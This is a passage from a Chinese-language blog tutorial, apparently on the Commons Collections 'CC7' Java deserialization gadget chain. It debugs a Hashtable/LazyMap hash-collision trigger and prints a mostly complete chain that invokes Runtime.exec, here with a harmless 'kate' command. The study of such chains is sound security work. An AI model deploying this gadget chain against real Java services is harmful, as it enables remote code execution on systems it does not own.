，触发利用链，这是我们不想看到的，和之前一样反射调用，先制空一个值。  这里选择制空  <code>ChainedTransformer</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">ChainedTransformer</span> transform <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> transform<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Field</span> iTransformers <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"iTransformers\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>transform<span class=\"token punctuation\">,</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>更改过后，在进行序列化和反序列化测试，发现并没有执行代码，在执行点下入断点，进行调试<br />\n<img data-src=\"https://s2.loli.net/2022/10/24/5xkuoijLDGnQKpl.png\" alt=\"2022-10-24_01-01.png\" /><br />\n 我们发现 <code>lazyMap2</code> （就是我们传入的第二个 <code>key</code>  值）的值多出了一个值，导致 <code>m.size()</code>  和 <code>this.size()</code>  不相同，直接 <code>return</code>  了 <code>false</code> 。<br />\n我们想起之前在序列化之前，就调用了 <code>lazyMap</code>  的 <code>get</code>  值，我们把 <code>ChainedTransformer</code>  的值制空才解决了它调用利用链的问题，但是我们之前在的 <code>CC3</code>  中知道，进入到 <code>get</code>  会判断当前的 <code>key</code>  是否存在，如果不存在就会走到我们的 <code>factory.transform</code>  方法，但是出去时会把 <code>key</code>  值写入进入，导致第二次再进去的时候就不会走到 <code>factory.transform</code>  方法，现在我们清楚了在 <code>AbstractMap.equals()</code>  方法中，调用 <code>LazyMap.get(key)</code>  方法，这是第二个 <code>lazymap</code> ，此时 <code>key</code>  的值为 <code>yy</code> 。如果不移除第二个 <code>lazymap</code>  的这个元素，就不满足连锁反应 <code>rce</code>  的条件（ <code>lazymap</code>  调用 <code>get</code>  方法时， <code>key</code>  不存在）。再 <code>hashtable.put</code>  后移除 <code>lazyMap2</code>  的 <code>&quot;yy&quot;</code>  值</p>\n<blockquote>\n<p>附上一段 <code>put</code>  的代码，和 <code> reconstitutionPut</code>  的原理差不多，都是去  <code>(entry.hash == hash) &amp;&amp; entry.key.equals(key)</code></p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">synchronized</span> <span class=\"token class-name\">V</span> <span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span> key<span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token comment\">// Make sure the value is not null</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// Makes sure the key is not already in the hashtable.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> tab<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> hash <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>hash <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x7FFFFFFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> entry <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">)</span>tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> entry <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span> entry <span class=\"token operator\">=</span> entry<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>entry<span class=\"token punctuation\">.</span>hash <span class=\"token operator\">==</span> hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> entry<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token class-name\">V</span> old <span class=\"token operator\">=</span> entry<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                entry<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">return</span> old<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>     <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">reconstitutionPut</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> tab<span class=\"token punctuation\">,</span> <span class=\"token class-name\">K</span> key<span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">StreamCorruptedException</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>StreamCorruptedException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// Makes sure the key is not already in the hashtable.</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">// This should not happen in deserialized version.</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">int</span> hash <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>hash <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x7FFFFFFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>hash <span class=\"token operator\">==</span> hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>StreamCorruptedException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token comment\">// Creates the new entry.</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">)</span>tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>问题解决</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap1 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap1<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        decorateMap1<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap2 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap2<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        decorateMap2<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zZ\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashtable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap1<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap2<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        decorateMap2<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> transform<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Field</span> iTransformers <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"iTransformers\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        iTransformers<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>transform<span class=\"token punctuation\">,</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><em><strong>完整调用链</strong></em></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformedMaps <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"kate\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//        ChainedTransformer transform = new ChainedTransformer(new Transformer[]&#123;&#125;);</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> transform <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap1 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap1<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        decorateMap1<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap2 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap2<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        decorateMap2<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zZ\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashtable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap1<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap2<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        decorateMap2<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> transform<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 